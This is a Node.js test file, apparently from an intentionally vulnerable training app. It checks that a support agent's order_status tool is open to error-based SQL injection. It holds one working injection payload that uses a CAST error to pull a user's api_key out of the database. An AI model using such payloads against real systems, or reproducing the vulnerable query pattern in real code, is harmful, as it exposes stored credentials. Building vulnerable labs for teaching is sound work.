const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability sqli-error-based
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/support/tools/index.js
 */
test('sqli-error-based: support.order_status leaks column via CAST error', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { orderStatus } = require(path.join(REPO, 'agent-host/agents/support/tools/index.js'));
    const r = await orderStatus({ order_id: `100 AND CAST((SELECT api_key FROM shop_users WHERE username='sasan') AS INTEGER)` });
    assert.match(JSON.stringify(r), /sk_ss_sasan_secret_key_deadbeef|CAST/);
  } finally {
    await s.close();
  }
});
